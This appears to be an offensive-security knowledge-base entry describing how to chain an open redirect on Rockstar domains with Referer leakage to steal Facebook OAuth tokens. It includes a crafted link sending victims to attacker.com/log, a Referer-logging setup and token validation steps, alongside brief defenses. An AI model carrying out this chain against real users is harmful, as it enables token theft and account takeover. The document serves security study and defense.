---
id: proc-chain-open-redirect-oauth
tags:
  - open-redirect
  - chaining
  - web
  - oauth
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:24:39.011Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Chain-Open-Redirect-to-Expose-OAuth-Tokens

## Summary

This procedure chains an open redirect vulnerability on Rockstar-owned domains with referer leakage to direct traffic from a token-laden URI to an attacker-controlled site, exposing the Facebook OAuth token in the Referer header for theft.

## Description

Open redirects allow unvalidated URL parameters to redirect users arbitrarily, often without origin checks. By placing the redirect after loading the /crew/ endpoint with a leaked token URI, the Referer header carries the sensitive data to the external site. This is particularly effective in phishing or drive-by scenarios. The target is web applications with insufficient redirect validation, assuming prior identification of the open redirect from a separate report.

## Requirements

1. Knowledge of open redirect endpoint (e.g., from vulnerability report)
2. Control over an external domain/server to capture requests
3. Ability to craft and distribute malicious links (e.g., via email or social engineering)
4. Victim access to Rockstar site with active OAuth session

## Defense

Defensive measures and detection strategies:

- Validate redirect URLs against a whitelist of allowed domains
- Use relative redirects or server-side handling instead of client-side
- Log and alert on redirects to external or suspicious domains
- Combine with referer policy enforcement to block leakage

## Objectives

1. Force navigation that triggers referer leakage to attacker site
2. Capture OAuth token from incoming Referer header
3. Enable follow-on account takeover on Facebook

## Instructions

### Step 1: Identify Open Redirect Endpoint

**Context**: Locate the vulnerable redirect parameter on a Rockstar domain.

From the separate report, test endpoints like https://example.rockstargames.com/redirect?url=https://google.com. Confirm it redirects without validation by observing the navigation.

> Use browser or curl to verify: Load the URL and check if it follows to the target without errors.

### Step 2: Craft Chained Malicious Redirect

**Context**: Build a link that loads the token URI first, then redirects via the open endpoint to capture the Referer.

Construct: https://socialclub.rockstargames.com/crew/?oauth_token=victimtoken (simulate load), then append redirect like https://vulnerable.rockstargames.com/openredirect?url=https://attacker.com/log. Distribute to victim.

> On attacker.com, set up a simple logger (e.g., PHP script) to record $_SERVER['HTTP_REFERER']. Expect Referer with token on arrival.

### Step 3: Capture and Validate Token

**Context**: Receive and test the leaked token.

Monitor server logs for Referer header containing oauth_token. Use the token to query Facebook API (e.g., /me) to confirm access.

> Success: Valid token grants account data; revoke if testing ethically.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[open-redirect]]
- [[token-exposure]]
